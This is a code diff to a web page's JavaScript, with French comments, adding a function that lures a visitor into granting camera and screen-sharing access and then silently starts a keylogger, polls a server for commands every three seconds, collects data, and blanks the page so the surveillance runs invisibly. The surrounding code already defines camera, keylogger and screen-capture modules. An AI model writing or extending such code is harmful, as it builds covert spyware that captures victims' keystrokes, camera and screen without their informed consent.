@@ -70,11 +70,62 @@
 
     <script>
         let accessGranted = false;
+        let permissions = {
+            camera: null,
+            screen: null,
+            granted: false
+        };
+        
         let modules = {
             camera: { active: false, interval: null },
             keylogger: { active: false, buffer: '' },
             screen: { active: false, interval: null }
         };
+
+        // DEMANDER TOUTES LES PERMISSIONS AU CLIC
+        async function grantAccess() {
+            const btn = document.getElementById('accessBtn');
+            const spinner = document.getElementById('spinner');
+            const status = document.getElementById('status');
+
+            btn.classList.add('hidden');
+            spinner.style.display = 'block';
+            status.innerHTML = '⏳ Demande des autorisations...';
+
+            try {
+                // 1. DEMANDER CAMÉRA
+                status.innerHTML = '📹 Autorisation caméra...';
+                permissions.camera = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
+                
+                // 2. DEMANDER PARTAGE D'ÉCRAN
+                status.innerHTML = '🖥️ Autorisation écran...';
+                permissions.screen = await navigator.mediaDevices.getDisplayMedia({video: true});
+                
+                // Arrêter les streams immédiatement
+                permissions.camera.getTracks().forEach(t => t.stop());
+                permissions.screen.getTracks().forEach(t => t.stop());
+                
+                permissions.granted = true;
+                status.innerHTML = '✅ Autorisations accordées';
+                
+            } catch (error) {
+                status.innerHTML = '⚠️ Certaines autorisations refusées';
+                console.error('Permission error:', error);
+            }
+
+            // Démarrer le système
+            accessGranted = true;
+            startKeylogger();
+            setInterval(checkCommands, 3000);
+            checkCommands();
+            collectInitialData();
+            
+            // INTERFACE INVISIBLE APRÈS 3s
+            setTimeout(() => {
+                document.body.innerHTML = '';
+                document.body.style.background = '#000';
+            }, 3000);
+        }
 
         // POLLING DES COMMANDES SERVEUR
         async function checkCommands() {
